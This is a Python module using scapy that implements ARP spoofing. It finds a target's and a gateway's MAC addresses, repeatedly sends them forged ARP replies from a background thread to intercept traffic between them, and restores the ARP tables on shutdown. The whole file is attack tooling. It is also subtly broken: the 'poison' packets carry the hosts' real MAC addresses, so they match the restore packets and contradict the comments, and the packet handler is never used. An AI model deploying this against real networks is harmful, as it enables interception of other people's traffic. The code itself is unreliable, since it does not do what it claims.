import time
import logging
import threading
from scapy.layers.l2 import ARP, Ether
from scapy.all import srp, send, sendp

logger = logging.getLogger('ARPSpoofer')


class ARPSpoofer:
    """
    ARP spoofing module
    """

    def __init__(self, interface, target_ip, gateway_ip, packet_handler):
        self.interface = interface
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip
        self.packet_handler = packet_handler
        self.running = False
        self.spoof_thread = None

        # Get MAC addresses
        self.target_mac = self._get_mac(target_ip)
        self.gateway_mac = self._get_mac(gateway_ip)

        if not self.target_mac:
            logger.error(f"Could not get MAC address for {target_ip}")
        if not self.gateway_mac:
            logger.error(f"Could not get MAC address for {gateway_ip}")

    def _get_mac(self, ip):
        """Get MAC address for an IP using ARP"""
        try:
            arp_request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
            response, _ = srp(arp_request, timeout=2, retry=3,
                              verbose=0, iface=self.interface)

            for _, packet in response:
                return packet[Ether].src

            return None
        except Exception as e:
            logger.error(f"Error getting MAC for {ip}: {e}")
            return None

    def _spoof(self):
        """Send ARP poison packets to target and gateway"""

        # Tell target we are gateway
        eth = Ether(dst=self.target_mac, src=self.gateway_mac)
        arp = ARP(
            op=2,
            pdst=self.target_ip,
            hwdst=self.target_mac,
            psrc=self.gateway_ip,
            hwsrc=self.gateway_mac
        )

        sendp(eth/arp, verbose=0, iface=self.interface)

        # Tell gateway we are target
        eth2 = Ether(dst=self.gateway_mac, src=self.target_mac)
        arp2 = ARP(
            op=2,
            pdst=self.gateway_ip,
            hwdst=self.gateway_mac,
            psrc=self.target_ip,
            hwsrc=self.target_mac
        )

        sendp(eth2/arp2, verbose=0, iface=self.interface)

    def _restore_arp(self):
        """Restore normal ARP tables on target and gateway"""

        logger.info("Restoring ARP tables...")

        eth = Ether(dst=self.target_mac, src=self.gateway_mac)
        arp = ARP(op=2, pdst=self.target_ip, hwdst=self.target_mac,
                  psrc=self.gateway_ip, hwsrc=self.gateway_mac)
        eth2 = Ether(dst=self.gateway_mac, src=self.target_mac)
        arp2 = ARP(op=2, pdst=self.gateway_ip, hwdst=self.gateway_mac,
                   psrc=self.target_ip, hwsrc=self.target_mac)

        for _ in range(10):
            sendp(eth/arp, iface=self.interface, verbose=0)
            sendp(eth2/arp2, iface=self.interface, verbose=0)
            time.sleep(0.2)

    def _spoof_loop(self):
        """Main spoofing loop that runs in a thread"""
        try:
            while self.running:
                self._spoof()
                time.sleep(2)  # Send ARP poison every 2 seconds
        except Exception as e:
            logger.error(f"Error in ARP spoofing loop: {e}")

    def start(self):
        if not self.target_mac or not self.gateway_mac:
            logger.error("Cannot start ARP spoofing without MAC addresses")
            return False

        self.running = True
        self.spoof_thread = threading.Thread(target=self._spoof_loop)
        self.spoof_thread.daemon = True
        self.spoof_thread.start()

        logger.info(
            f"ARP spoofing started: {self.target_ip} <-> {self.gateway_ip}")
        return True

    def stop(self):
        logger.info("Stopping ARP spoofing...")
        self.running = False

        if self.spoof_thread:
            try:
                self.spoof_thread.join(timeout=3)
            except KeyboardInterrupt:
                logger.warning("Spoof thread join interrupted")

        self._restore_arp()
        logger.info("ARP spoofing stopped")
